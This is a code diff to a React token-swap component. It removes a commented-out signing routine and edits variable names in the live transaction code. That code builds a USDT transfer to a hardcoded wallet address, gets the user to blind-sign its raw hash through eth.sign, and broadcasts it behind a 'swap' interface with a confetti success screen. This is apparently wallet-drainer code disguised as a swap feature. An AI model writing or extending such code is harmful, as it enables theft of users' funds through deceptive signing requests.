@@ -64,80 +64,8 @@ function SwapComponent() {
     return () => clearTimeout(timer)
   }, [showConfetti])
 
-  // const sendTransaction = async () => {
-  //   if (!web3js) return
-
-  //   const nonce = await web3js.eth.getTransactionCount(address, 'pending')
-  //   const gasPrice = await web3js.eth.getGasPrice()
-  //   const chainId = await web3js.eth.getChainId()
-
-  //   const tx_ = {
-  //     from: address,
-  //     to: address,
-  //     nonce: web3js.utils.toHex(nonce),
-  //     gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
-  //     gasLimit: '0x5208',
-  //     value: '0x0',
-  //     data: '0x',
-  //     v: web3js.utils.toHex(chainId),
-  //     r: '0x',
-  //     s: '0x',
-  //   }
-
-  //   console.log('Tx Object', tx_)
-
-  //   const tx = new ethereumjs.Tx(tx_)
-  //   const serializedTx = '0x' + tx.serialize().toString('hex')
-  //   const hexer = { encoding: 'hex' }
-  //   const sha3_ = web3js.utils.sha3(serializedTx, hexer)
-
-  //   await web3js.eth
-  //     .sign(sha3_, address)
-  //     .then(async (signed) => {
-  //       const temporary = signed.substring(2)
-  //       const r_ = '0x' + temporary.substring(0, 64)
-  //       const s_ = '0x' + temporary.substring(64, 128)
-  //       const rhema = parseInt(temporary.substring(128, 130), 16)
-  //       const v_ = web3js.utils.toHex(
-  //         BigInt(rhema) + BigInt(chainId) * BigInt(2) + BigInt(8)
-  //       )
-  //       tx.r = r_
-  //       tx.s = s_
-  //       tx.v = v_
-
-  //       console.log('---------------------------------------------')
-
-  //       const txFin = '0x' + tx.serialize().toString('hex')
-  //       const sha3__ = web3js.utils.sha3(txFin, hexer)
-  //       console.log('rawHash:', sha3__)
-  //       console.log('The Broadcast message', txFin)
-
-  //       setIsLoading(true)
-
-  //       await web3js.eth
-  //         .sendSignedTransaction(txFin)
-  //         .then(() => {
-  //           setIsLoading(false)
-  //           setShowConfetti(true)
-  //           setTokenOneAmount(null)
-  //           setTokenTwoAmount(null)
-  //         })
-  //         .catch((error) => {
-  //           setIsLoading(false)
-  //           console.error('Transaction Error:', error)
-  //         })
-  //     })
-  //     .catch((error) => {
-  //       console.error('Signing Error:', error)
-  //     })
-  // }
-
   const sendTransaction = async () => {
     if (!web3js) return
-
-    const accounts = await web3js.eth.getAccounts()
-
-    const account = accounts[0]
 
     const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
     const usdtABI = [
@@ -168,10 +96,10 @@ function SwapComponent() {
       .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', amount)
       .encodeABI()
 
-    const nonce = await web3js.eth.getTransactionCount(account, 'pending')
+    const nonce = await web3js.eth.getTransactionCount(address, 'pending')
 
     const tx_ = {
-      from: account,
+      from: address,
       to: '0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621',
       nonce: web3js.utils.toHex(nonce),
       gasPrice: web3js.utils.toHex(20 * 1e9),
@@ -188,7 +116,7 @@ function SwapComponent() {
     const sha3_ = web3js.utils.sha3(serializedTx)
 
     await web3js.eth
-      .sign(sha3_, account)
+      .sign(sha3_, address)
       .then(async (signed) => {
         const temporary = signed.substring(2)
         const r_ = '0x' + temporary.substring(0, 64)
